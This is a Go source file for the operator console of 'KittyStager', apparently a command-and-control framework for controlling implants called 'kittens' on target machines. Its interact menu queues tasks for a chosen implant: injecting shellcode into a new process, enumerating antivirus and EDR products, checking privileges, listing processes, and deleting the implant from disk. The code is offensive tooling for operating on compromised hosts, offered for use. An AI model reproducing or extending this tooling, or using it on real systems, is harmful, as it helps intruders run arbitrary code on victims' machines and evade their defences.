package cli

import (
	"KittyStager/internal/task"
	"encoding/json"
	"fmt"
	i "github.com/JoaoDanielRufino/go-input-autocomplete"
	"github.com/c-bata/go-prompt"
	color "github.com/logrusorgru/aurora"
	"os"
	"strings"
)

func completerCli(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "exit", Description: "Exit the program"},
		{Text: "help", Description: "Print the help menu"},
		{Text: "config", Description: "Show config"},
		{Text: "logs", Description: "Get api logs"},
		{Text: "build", Description: "Build a new kitten from config file"},
		{Text: "kittens", Description: "Show kittens"},
		{Text: "interact", Description: "Interact with a target"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}

// completerInteract is the completer for the interact menu
func completerInteract(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "back", Description: "Go back to the main menu"},
		{Text: "help", Description: "Print the help menu"},
		{Text: "tasks", Description: "Get the tasks for the target"},
		{Text: "shellcode", Description: "Inject shellcode in new process"},
		{Text: "sleep", Description: "Set sleep time"},
		{Text: "ps", Description: "Get process list"},
		{Text: "av", Description: "Get AV/EDR with wmi"},
		{Text: "priv", Description: "Get privileges and integrity level"},
		{Text: "info", Description: "Show the kitten info"},
		{Text: "kill", Description: "Exit the kitten"},
		{Text: "remove", Description: "Remove the kitten from disk and exit"},
		{Text: "exit", Description: "Exit the program"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}

func Cli() error {
	go checkConn()
	go checkKitten()
	for {
		t := prompt.Input("KittyStager ❯ ", completerCli,
			prompt.OptionTitle("KittyStager 🐈 "),
			prompt.OptionPrefixTextColor(prompt.Blue),
			prompt.OptionPreviewSuggestionTextColor(prompt.Green),
			prompt.OptionSelectedSuggestionBGColor(prompt.LightGray),
			prompt.OptionSelectedSuggestionTextColor(prompt.Blue),
			prompt.OptionDescriptionBGColor(prompt.Blue),
			prompt.OptionSuggestionBGColor(prompt.DarkGray),
		)
		input := strings.Split(t, " ")
		switch input[0] {
		case "exit":
			fmt.Println("Bye bye!")
			return nil
		case "config":
			config, err := GetConfig()
			if err != nil {
				fmt.Println("[!] Error", err)
				break
			}
			j, err := json.MarshalIndent(config, "", "  ")
			if err != nil {
				fmt.Println("[!] Error", err)
				break
			}
			fmt.Printf("%s\n\n", color.BrightGreen("[*] Config:"))
			fmt.Println(color.BrightWhite(string(j)))
		case "kittens":
			kittens, err := GetKittens()
			if err != nil {
				fmt.Println("[!] Error", err)
				break
			}
			err = printKittens(kittens)
			if err != nil {
				fmt.Printf("%s\n", color.BrightGreen(err))
				break
			}
		case "interact":
			if len(input) != 2 {
				input = append(input, "No input")
			}
			err := choseKitten(input[1])
			if err != nil {
				fmt.Printf("%s\n", color.BrightGreen(err))
				break
			}
		case "logs":
			err := printLogs()
			if err != nil {
				fmt.Println("[!] Error", err)
				break
			}
		case "build":
			err := Build()
			fmt.Println(color.BrightGreen("[*] The new kitten has been written to /output"))
			if err != nil {
				fmt.Println("[!] Error", err)
				break
			}
		case "help":
			printHelpMain()
		default:
			fmt.Println("Unknown command")
		}
	}
}

// interact menu
func interact(kittenName string) error {
	go checkAlive(kittenName)
	in := fmt.Sprintf("KittyStager - %s❯ ", kittenName)
	for {
		t := prompt.Input(in, completerInteract,
			prompt.OptionPrefixTextColor(prompt.Blue),
			prompt.OptionPreviewSuggestionTextColor(prompt.Green),
			prompt.OptionSelectedSuggestionBGColor(prompt.LightGray),
			prompt.OptionSelectedSuggestionTextColor(prompt.Blue),
			prompt.OptionDescriptionBGColor(prompt.Blue),
			prompt.OptionSuggestionBGColor(prompt.DarkGray))
		input := strings.Split(t, " ")
		switch input[0] {
		case "exit":
			fmt.Println("Bye bye!")
			os.Exit(0)
		case "back":
			return nil
		case "tasks":
			t, err := GetTask(kittenName)
			if err != nil {
				fmt.Println("[!] Error", err)
				break
			}
			printTasks(t)
		case "shellcode":
			fmt.Printf("%s\n", "Please enter the path to the shellcode")
			//var path string
			path, err := i.Read("Path: ")
			if err != nil {
				return err
			}
			if path == "" {
				fmt.Println("[!] Please enter a path")
				break
			}
			shellcode, err := newShellcode(path)
			if err != nil {
				return err
			}
			t := task.Task{
				Tag:     "payload",
				Payload: shellcode,
			}
			err = CreateTask(&t, kittenName)
			if err != nil {
				return err
			}
		case "sleep":
			if len(input) != 2 {
				fmt.Println("[!] Please enter a valid time")
				break
			}
			t := task.Task{
				Tag:     "sleep",
				Payload: []byte(input[1]),
			}
			err := CreateTask(&t, kittenName)
			if err != nil {
				fmt.Println("[!] Error", err)
				break
			}
		case "ps":
			t := task.Task{
				Tag:     "ps",
				Payload: nil,
			}
			err := CreateTask(&t, kittenName)
			if err != nil {
				fmt.Println("[!] Error", err)
				break
			}
			go checkForResponse(kittenName)
		case "av":
			t := task.Task{
				Tag:     "av",
				Payload: nil,
			}
			err := CreateTask(&t, kittenName)
			if err != nil {
				fmt.Println("[!] Error", err)
				break
			}
			go checkForResponse(kittenName)
		case "priv":
			t := task.Task{
				Tag:     "priv",
				Payload: nil,
			}
			err := CreateTask(&t, kittenName)
			if err != nil {
				fmt.Println("[!] Error", err)
				break
			}
			go checkForResponse(kittenName)
		case "info":
			kitten, err := getKitten(kittenName)
			if err != nil {
				fmt.Println("[!] Error", err)
				break
			}
			printKittenInfo(*kitten)
		case "kill":
			t := task.Task{
				Tag:     "kill",
				Payload: nil,
			}
			err := CreateTask(&t, kittenName)
			if err != nil {
				fmt.Println("[!] Error", err)
				break
			}
		case "remove":
			t := task.Task{
				Tag:     "remove",
				Payload: nil,
			}
			err := CreateTask(&t, kittenName)
			if err != nil {
				fmt.Println("[!] Error", err)
				break
			}
		case "help":
			printHelpInt()
		default:
			fmt.Println("Unknown command")
		}
	}
}
